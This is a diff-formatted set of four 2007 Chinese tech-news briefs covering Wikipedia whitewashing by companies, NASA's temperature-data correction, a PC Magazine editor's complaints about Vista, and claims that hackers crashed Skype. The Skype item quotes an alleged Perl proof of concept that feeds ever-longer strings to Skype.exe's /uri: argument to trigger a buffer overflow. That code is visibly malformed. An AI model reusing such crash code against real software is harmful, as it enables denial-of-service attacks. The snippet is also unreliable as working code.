@@ -1,0 +1,30 @@
+➜维基百科修改趣闻
+https://www.solidot.org/story?sid=3595	3480
+Wikipedia Scanner上线之后，<a href="__SLASHLINK__" sect="internet" sid="07/08/16/0446208" sn="article" tid="48">用户发现了许多大公司的粉刷行为</a>。比如石油巨头埃克森公司删除了1989年<a href="http://en.wikipedia.org/w/index.php?diff=prev&amp;oldid=8931861">EXXON VALDEZ油轮原油泄漏</a>事件的长期影响段落，加了一段不会对环境造成长期影响的声明；迪斯尼米老鼠删除了2段描述<a href="http://en.wikipedia.org/w/index.php?title=Digital_rights_management&amp;diff=prev&amp;oldid=8981085">DRM提倡者</a>的段落；亚马逊在维基百科上做广告，在<a href="http://en.wikipedia.org/w/index.php?diff=prev&amp;oldid=19168175">帕里斯希尔顿</a>的页面上加了一个链接；半岛电视台称<a href="http://en.wikipedia.org/w/index.php?diff=prev&amp;oldid=48702431">以色列建国</a>和希特勒屠杀犹太人一样糟；苹果的某人讨厌维基百科用户，他上传了一张<a href="http://en.wikipedia.org/w/index.php?title=Oscar%20Goodman&amp;oldid=3689866">生殖器照片</a>，然后说“这就是我眼里的维客”。<i>自然其中少不了微软，微软的某位雇员多次修改了<a href="http://en.wikipedia.org/w/index.php?title=Microsoft&amp;diff=12810696&amp;oldid=12804218">Microsoft</a>词目：修改了微软利用从SCO购买的UNIX专利对Linux公司进行法律攻击段落；删除了“And because of design decisions which often value ease of use over security.”；微软软件的总拥有成本比竞争对手总体上要贵，他在后面加了一句“
+<a href="http://en.wikipedia.org/w/index.php?title=Microsoft&amp;diff=prev&amp;oldid=14180729">Several independent studies dispute this assumption.</a>”——微软员工特别喜欢这句话。</i>
+➜NASA回应全球变暖喧嚣
+https://www.solidot.org/story?sid=3596	15120
+博客Jim Angle从NASA气候数据中<a href="__SLASHLINK__" sect="science" sid="07/08/12/0330206" sn="article" tid="53">发现了千年虫</a>。NASA首席气候学家James Hansen博士就修正后的气候数据发表了一个声明，<a href="http://mediamatters.org/items/200708120001">NASA承认错误</a>，1934年是记录以来最热的一年，之后是1998年，第三是1921年。但是他指出这对全球温度的影响根本就微不足道，修正前与修正后的数据曲线几乎没有区别。Hansen博士给出了两张从1880年到2000年的<a href="http://climateprogress.org/2007/08/16/must-read-from-hansen-stop-the-madness-about-the-tiny-revision-in-nasas-temperature-data/">全球气温和美国气温变化对比图</a>，解释了错误发生的原因（并非是什么千年虫），全球变暖确确实实在发生。他认为攻击全球变暖谎言的人不是很蠢，但是他只是在试图创造一次骚动，把气候变化的故事搅浑。
+➜PC Magazine主编开始讨厌Vista
+https://www.solidot.org/story?sid=3597	17880
+以前他是Vista热心的拥护者，现在他只想扔掉它。PC Magazine主编Jim Louderback在表明了辞职的决定后发泄了<a href="http://www.pcmag.com/article2/0,1895,2171472,00.asp">对微软新操作系统不满</a>：<i>
+“过去几个月我是微软新OS的主要支持者，甚至我在我所有的电脑上都安装上了Vista，并花了许多时间对系统进行调整和优化，那么为什么我在Vista发布9个月后对它表示厌倦呢？反反复复出现的不能正常工作情况，不断的打击我，让我感到沮丧。结果是即使过来9个月，Vista还是没有完善。在这个操作系统上我肯定给了微软太多的信任（free pass）：我本来期待它能让工作更顺利的进行。但是朋友，我被耍了！如果微软不能完善Vista，我可能会做以前无法想像的事：投奔Linux。”
+</i>
+Jim Louderback主要抱怨了驱动方面的问题，Linux的驱动问题更严重。如果他真的使用了Linux，谁知道<a href="http://slashdot.org/article.pl?sid=07/08/18/1512243">他会发表什么高论</a>。
+➜俄罗斯黑客让Skype崩溃？
+https://www.solidot.org/story?sid=3598	19440
+这几天常使用Skype网络电话的人都遭遇到了长时间无法连接的情况。一个俄罗斯论坛的帖子声称<a href="http://www.xakep.ru/post/39746/default.asp">世界范围的Skype崩溃是俄罗斯黑客所为</a>（俄语），黑客声称他们发现了一个本地缓冲溢出漏洞，可以通过向Skype验证服务器发送长字符串引发。这里是用Google翻译工具将<a href="http://translate.google.com/translate?u=http%3A%2F%2Fwww.xakep.ru%2Fpost%2F39746%2Fdefault.asp&amp;langpair=ru%7Cen&amp;hl=en&amp;ie=UTF8">俄语翻译成英语</a>，其中主要的代码是用英文写成，比较容易看懂。但是Skype官方发表的声明<a href="http://www.washingtonpost.com/wp-dyn/content/article/2007/08/17/AR2007081702088.html?hpid=sec-tech">否认了这一流言</a>，称既非系统崩溃也不是黑客攻击。           代码：<br>
+!/usr/bin/perl <br>
+# Simle Code by Maranax Porex ;D <br>
+# Ya Skaypeg!! <br> <br>
+for ($i=256; $i&gt;xCCCCC; $i=$i+256)<br>
+{ <br>
+$eot='AAAA' x $i; <br>
+call_sp(); <br>
+} <br>
+exit; <br> <br>
+sub call_sp()<br>
+{ <br>
+$str="\"C:\\Program <br>Files\\Skype\\Phone\\Skype.exe\" <br>\"/uri:$eot\""; <br>
+system("$str");<br>
+}<br>
